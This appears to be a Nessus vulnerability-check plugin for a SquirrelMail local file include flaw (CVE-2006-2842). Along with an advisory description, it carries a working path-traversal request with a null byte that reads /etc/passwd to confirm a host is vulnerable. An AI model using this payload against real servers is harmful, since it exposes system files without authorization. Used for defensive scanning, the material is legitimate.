#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is affected by a
local file include issue. 

Description :

The version of SquirrelMail installed on the remote fails to properly
sanitize user-supplied input to the 'plugins' parameter of the
'functions/plugin.php' script before using it in a PHP
'include_once()' function.  Provided PHP's 'register_globals' setting
is enabled, an unauthenticated attacker may be able to exploit this
issue to view arbitrary files or to execute arbitrary PHP code on the
remote host, subject to the privileges of the web server user id. 

See also :

http://www.securityfocus.com/archive/1/435605/30/0/threaded
http://www.squirrelmail.org/security/issue/2006-06-01

Solution :

Disable PHP's 'register_globals' setting or apply the patch referenced
in the project's advisory above. 

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description)
{
  script_id(21630);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-2842");
  script_bugtraq_id(18231);

  script_name(english:"SquirrelMail plugins Parameter Local File Include Vulnerability");
  script_summary(english:"Tries to read file using SquirrelMail");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("squirrelmail_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/squirrelmail"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit the flaw to read a file.
  file = "../../../../../../../../../../etc/passwd";
  path = SCRIPT_NAME;
  req = http_get(
    item:string(
      dir, "/src/redirect.php?",
      "plugins[]=", file, "%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # it looks like Squirrelmail and...
    "SquirrelMail" >< res &&
    # there's an entry for root
    egrep(pattern:"root:.*:0:[01]:", string:res)
  )
  {
    contents = res - strstr(res, "<br");

    report = string(
      desc,
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Here are the contents of the file '/etc/passwd' that Nessus\n",
      "was able to read from the remote host :\n",
      "\n",
      contents
    );

    security_warning(port:port, data:report);
    exit(0);
  }
}
